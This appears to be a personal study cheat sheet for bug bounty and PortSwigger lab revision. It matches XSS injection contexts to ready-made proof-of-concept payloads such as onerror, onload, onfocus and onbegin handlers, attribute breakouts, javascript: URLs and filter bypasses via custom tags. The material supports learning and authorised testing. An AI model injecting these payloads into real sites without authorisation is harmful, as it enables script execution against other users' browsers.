# XSS Contexts Bug Bounty Indicators

## Purpose

This guide helps connect:

```text
Observation
        ↓
Possible Context
        ↓
Likely Vulnerability
        ↓
Payload Strategy
        ↓
Related PortSwigger Lab
```

Useful during:

- Bug Bounty Hunting
- Web Application Pentesting
- PortSwigger Revision
- Interviews

---

# Scenario 1

## Input Appears Between HTML Tags

### Observation

```html
<p>USER_INPUT</p>
```

or

```html
<div>USER_INPUT</div>
```

---

### Context

```text
HTML Context
```

---

### Possible Vulnerability

```text
Reflected XSS
Stored XSS
```

---

### Testing

Try:

```html
<img src=1 onerror=alert(1)>
```

---

Alternative:

```html
<svg onload=alert(1)>
```

---

### Related Labs

```text
Lab11
Lab13
```

---

# Scenario 2

## Input Appears Inside HTML Attribute

### Observation

```html
<input value="USER_INPUT">
```

---

### Context

```text
Attribute Context
```

---

### Testing

Try:

```html
" onmouseover="alert(1)
```

---

Alternative:

```html
" autofocus onfocus="alert(1)
```

---

### Related Labs

```text
Lab15
```

---

# Scenario 3

## Input Controls href Attribute

### Observation

```html
<a href="USER_INPUT">
```

---

### Context

```text
URL Context
```

---

### Testing

Try:

```javascript
javascript:alert(1)
```

---

Alternative:

```javascript
javascript:alert(document.domain)
```

---

### Related Labs

```text
Lab16
```

---

# Scenario 4

## Tags Are Filtered

### Observation

```html
<script>
```

blocked.

---

### Possible Opportunity

```text
Filter Bypass
```

---

### Testing Strategy

Find:

```text
Allowed Tags
        ↓
Allowed Attributes
        ↓
Allowed Events
```

---

### Related Labs

```text
Lab11
```

---

# Scenario 5

## Standard Tags Blocked

### Observation

Blocked:

```html
<script>
<img>
<svg>
```

---

### Testing

Try:

```html
<xss>
```

---

Alternative:

```html
<custom>
```

---

### Related Labs

```text
Lab12
Lab14
```

---

# Scenario 6

## Custom Tags Allowed

### Observation

```html
<xss>
```

survives filtering.

---

### Testing

```html
<xss id=x tabindex=1 onfocus=alert(1)>
```

---

### Trigger

```text
#x
```

---

### Related Labs

```text
Lab12
Lab14
```

---

# Scenario 7

## SVG Allowed

### Observation

```html
<svg>
```

survives filtering.

---

### Testing

```html
<svg onload=alert(1)>
```

---

### Related Labs

```text
Lab13
```

---

# Scenario 8

## SVG Animate Allowed

### Observation

```html
<animate>
```

allowed.

---

### Testing

```html
<svg>
<animate
attributeName=x
dur=1s
repeatCount=1
onbegin=alert(1)>
</svg>
```

---

### Related Labs

```text
Lab13
```

---

# Scenario 9

## Reflection Occurs In Canonical Tag

### Observation

```html
<link rel="canonical"
href="USER_INPUT">
```

---

### Context

```text
Attribute Context
```

---

### Testing

```html
'accesskey='x'
onclick='alert(1)
```

---

### Trigger

```text
ALT + SHIFT + X
```

---

### Related Labs

```text
Lab17
```

---

# Scenario 10

## Angle Brackets Encoded

### Observation

```html
<
>
```

become:

```html
&lt;
&gt;
```

---

### Important

Do NOT assume:

```text
XSS Impossible
```

---

### Test

```html
" onmouseover="alert(1)
```

---

### Related Labs

```text
Lab15
Lab17
```

---

# Scenario 11

## Input Stored In Comments

### Observation

```text
Blog Comments
Reviews
Profiles
```

---

### Check

Where does data appear?

```text
HTML?
Attribute?
JavaScript?
```

---

### Related Labs

```text
Lab16
```

---

# Scenario 12

## Event Handlers Allowed

### Observation

Allowed:

```html
onclick
onfocus
onmouseover
onresize
onbegin
```

---

### Opportunity

```text
XSS Likely
```

---

### Related Labs

```text
Lab11
Lab12
Lab13
Lab14
Lab15
Lab17
```

---

# Bug Bounty Workflow

```text
Find Reflection
        ↓
Identify Context
        ↓
HTML?
Attribute?
URL?
JavaScript?
        ↓
Find Allowed Elements
        ↓
Find Allowed Events
        ↓
Craft Payload
        ↓
Verify Execution
```

---

# Context → Payload Quick Reference

| Context | First Payload To Try |
|----------|----------|
| HTML | `<img src=1 onerror=alert(1)>` |
| HTML | `<svg onload=alert(1)>` |
| Attribute | `" onmouseover="alert(1)` |
| Attribute | `" autofocus onfocus="alert(1)` |
| href | `javascript:alert(1)` |
| Custom Tag | `<xss id=x tabindex=1 onfocus=alert(1)>` |
| SVG Animate | `<animate onbegin=alert(1)>` |
| Canonical Tag | `accesskey + onclick` |

---

# Personal Revision Note

During bug bounty hunting, never start with:

```text
Which Payload Should I Use?
```

Start with:

```text
Where Is My Input Reflected?
```

Because:

```text
Context
        ↓
Determines
        ↓
Payload
```

This single mindset solves most XSS challenges.